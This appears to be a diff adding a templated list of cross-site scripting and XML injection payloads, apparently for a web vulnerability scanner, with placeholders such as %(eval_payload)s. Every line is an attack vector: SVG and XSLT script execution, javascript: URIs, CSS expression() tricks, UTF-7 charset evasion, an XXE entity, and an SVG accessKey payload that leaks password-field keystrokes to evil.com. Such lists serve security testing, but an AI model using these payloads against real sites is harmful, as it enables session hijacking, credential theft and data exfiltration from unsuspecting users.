+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:%(eval_payload)s"/> <animation xlink:href="data:text/xml,%%3Csvg xmlns='http://www.w3.org/2000/svg' onload='%(eval_payload)s'%%3E%%3C/svg%%3E"/> <image xlink:href="data:image/svg+xml,%%3Csvg xmlns='http://www.w3.org/2000/svg' onload='%(eval_payload)s'%%3E%%3C/svg%%3E"/> <foreignObject xlink:href="javascript:%(eval_payload)s"/> <foreignObject xlink:href="data:text/xml,%%3Cscript xmlns='http://www.w3.org/1999/xhtml'%%3E%(eval_payload)s%%3C/script%%3E"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="%(eval_payload)s"/> <animate attributeName="onunload" to="%(eval_payload)s"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">%(eval_payload)s</handler> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"> <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E %(eval_payload)s %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/> </svg>
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
+<svg xmlns="http://www.w3.org/2000/svg"> <a id="x"><rect fill="white" width="1000" height="1000"/></a> <rect fill="white" style="clip-path:url(%(svg3)s#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <path d="M0,0" style="marker-start:url(%(svg4)s#a)"/> </svg>
+<?xml version="1.0"?> <?xml-stylesheet type="text/xml" href="#stylesheet"?> <!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]> <svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:%(eval_payload)s"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" id="x"> <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/> <handler id="y">%(eval_payload)s</handler> </svg>
+<svg><style>&ltimg/src=x onerror=%(eval_payload)s// </b>
+<svg> <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.%(eval_payload)s</script></svg>")'> <!-- Same effect with <image filter='...'> --> </svg>
+<!doctype html> <form> <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label> <br> <input name="secret" type="password"> </form> <!-- injection --><svg height="50px"> <image xmlns:xlink="http://www.w3.org/1999/xlink"> <set attributeName="xlink:href" begin="accessKey(a)" to="//evil.com/?a" /> <set attributeName="xlink:href" begin="accessKey(b)" to="//evil.com/?b" /> <set attributeName="xlink:href" begin="accessKey(c)" to="//evil.com/?c" /> <set attributeName="xlink:href" begin="accessKey(d)" to="//evil.com/?d" /> </image> </svg>
+<?xml-stylesheet href="javascript:%(eval_payload)s"?>
+qsdf
+<!DOCTYPE x[<!ENTITY x SYSTEM "%(xxe)s">]><y>&x;</y>
+<?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3E%(eval_payload)s%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?> <root/>
+<!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "%(eval_payload)s"> ]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:%(eval_payload)s" xlink:type="simple">XXX</x> </doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:%(eval_payload)s"/></onevent><timer value="1"/></card>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "%(dtd)s"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(%(eval_payload)s)"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%(xdr)s"/>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:%(eval_payload)s" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(%(eval_payload)s);%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:%(eval_payload)s"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:%(eval_payload)s//#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%(evt)s#x"/>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>eval&A7&("%(eval_payload)s")&R&UA;&&<&A9&11/script&X&>
+<meta charset="mac-farsi">¼script¾%(eval_payload)s¼/script¾
+X<x style=`behavior:url(#default#time2)` onbegin=`%(eval_payload)s` >
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%(eval_payload)s&gt;`>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=%(eval_payload)s&gt;>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:%(eval_payload)s strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:%(eval_payload)s">XXX</a>
+<x style="behavior:url(%(sct)s)">
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<event-source src="%(event)s" onload="%(eval_payload)s">
+<a href="javascript:%(eval_payload)s"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=%(eval_payload)s&gt;">
+<script>%(payload)s</script>
+<script src=%(jscript)s></script>
+<script language='javascript' src='%(jscript)s'></script>
+<script>%(eval_payload)s</script>
+<IMG SRC="javascript:%(eval_payload)s;">
+<IMG SRC=javascript:%(eval_payload)s>
+<IMG SRC=`javascript:%(eval_payload)s`>
+<SCRIPT SRC=%(jscript)s?<B>
+<FRAMESET><FRAME SRC="javascript:%(eval_payload)s;"></FRAMESET>
+<BODY ONLOAD=%(eval_payload)s>
+<BODY ONLOAD=javascript:%(eval_payload)s>
+<IMG SRC="jav	ascript:%(eval_payload)s;">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=%(eval_payload)s>
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<IMG SRC="javascript:%(eval_payload)s"
+<iframe src=%(scriptlet)s <
+<INPUT TYPE="IMAGE" SRC="javascript:%(eval_payload)s;">
+<IMG DYNSRC="javascript:%(eval_payload)s">
+<IMG LOWSRC="javascript:%(eval_payload)s">
+<BGSOUND SRC="javascript:%(eval_payload)s;">
+<BR SIZE="&{%(eval_payload)s}">
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:%(eval_payload)s;">
+<STYLE>@import'%(css)s';</STYLE>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<XSS STYLE="behavior: url(%(htc)s);">
+<STYLE>li {list-style-image: url("javascript:%(eval_payload)s");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:%(eval_payload)s;">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:%(eval_payload)s;">
+<IFRAME SRC="javascript:%(eval_payload)s;"></IFRAME>
+<TABLE BACKGROUND="javascript:%(eval_payload)s">
+<TABLE><TD BACKGROUND="javascript:%(eval_payload)s">
+<DIV STYLE="background-image: url(javascript:%(eval_payload)s)">
+<DIV STYLE="width:expression(%(eval_payload)s);">
+<IMG STYLE="xss:expr/*XSS*/ession(%(eval_payload)s)">
+<XSS STYLE="xss:expression(%(eval_payload)s)">
+<STYLE TYPE="text/javascript">%(eval_payload)s;</STYLE>
+<STYLE>.XSS{background-image:url("javascript:%(eval_payload)s");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:%(eval_payload)s")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>%(eval_payload)s;</SCRIPT><![endif]-->
+<BASE HREF="javascript:%(eval_payload)s;//">
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:%(eval_payload)s></OBJECT>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:%(eval_payload)s"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;%(eval_payload)s&lt;/SCRIPT&gt;"></BODY></HTML>
+<SCRIPT SRC="%(jpg)s"></SCRIPT>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<form id="test" /><button form="test" formaction="javascript:%(eval_payload)s">X
+<body onscroll=%(eval_payload)s><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="%(eval_payload)s">
+<STYLE>@import'%(css)s';</STYLE>
+<STYLE>a{background:url('s1' 's2)}@import javascript:%(eval_payload)s;');}</STYLE>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>%(eval_payload)s&&;&&<&&/script&&>
+<SCRIPT onreadystatechange=javascript:%(eval_payload)s;></SCRIPT>
+<style onreadystatechange=javascript:%(eval_payload)s;></style>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>%(eval_payload)s;</html:script></html:html>
+<embed code=%(scriptlet)s></embed>
+<embed code=javascript:%(eval_payload)s;></embed>
+<embed src=%(jscript)s></embed>
+<frameset onload=javascript:%(eval_payload)s></frameset>
+<object onerror=javascript:%(eval_payload)s>
+<embed type="image" src=%(scriptlet)s></embed>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:%(eval_payload)s;">]]</C><X></xml>
+<IMG SRC=&{%(eval_payload)s;};>
+<a href="jav&#65ascript:%(eval_payload)s">test1</a>
+<a href="jav&#97ascript:%(eval_payload)s">test1</a>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=%(eval_payload)s&amp;gt;>">
+<script>if(document.createElement("td").cellIndex == 0){%(payload)s}</script>
+<script>v=document.createElement("td").cellIndexif( v == -1){%(payload)s}</script>
+<script>v=document.createElement("td").cellIndexif( v> 1){%(payload)s}</script>
+<script>v=document.createElement("td").cellIndexif( v== undefined){%(eval_payload)s}</script>
